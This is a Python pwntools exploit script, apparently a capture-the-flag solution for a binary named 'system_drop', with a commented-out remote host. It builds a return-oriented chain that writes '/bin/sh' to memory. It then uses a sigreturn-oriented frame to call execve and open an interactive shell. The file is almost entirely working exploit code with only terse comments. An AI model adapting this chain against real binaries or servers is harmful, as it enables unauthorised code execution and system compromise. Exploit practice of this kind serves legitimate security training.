from pwn import *
from time import sleep
#from pwn import *
#p = remote('139.59.174.238',31897)
#p = process("./system_drop_patched")
p = process("./system_drop")
#raw_input()
#context.clear(
 #   arch="amd64",
    #log_level="debug"
#)
#pid = gdb.attach(p, gdbscript="break * main")

exe = context.binary = ELF('system_drop')
syscall = p64(0x000000000040053b)
pad = b'A' * 40  
bin_sh = p64(0x0601038)
pop_rsi_r15 = p64(0x00000000004005d1)
pop_rdi = p64(0x00000000004005d3)
read_plt = p64(0x0400440)
bin_sh_str = "/bin/sh\0"
padd = b"a" * 40
main = p64(0x00400541)
trash_addr = p64(0x00601028)
random_shit = "a" * 248
ret =p64(0x0000000000400416)

# payload1 for writing /bin/sh\0 for use later on 
payload1 = padd
payload1 += bytes(pop_rdi)
payload1 += p64(0x0)
payload1 += pop_rsi_r15
payload1 += bin_sh
payload1 += p64(0x0)
payload1 += read_plt
payload1 += main

p.send(payload1)
sleep(.1)
p.send(bin_sh_str+random_shit) # read wont stop reading so we shut him up by giving him all he can read
sleep(.1)

frame = SigreturnFrame()
frame.rax = 0x3b #59 for execve
frame.rdi = 0x0601038 #addr of /bin/sh we populated earlier
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = 0x040053b # syscall

newpad = trash_addr+b"a"*32 # addr at beginning for read 
payload2 = newpad
payload2 += ret
payload2 += read_plt
payload2 += syscall
payload2 += bytes(frame)[0:190] # we dont have enough space to fit the entire frame so we just use part of it we need
p.send(payload2)
sleep(.1)
p.send(b"aaaaaaaaaaaaaaa") # send in order to set rax to 15 to get sigreturn
p.interactive()

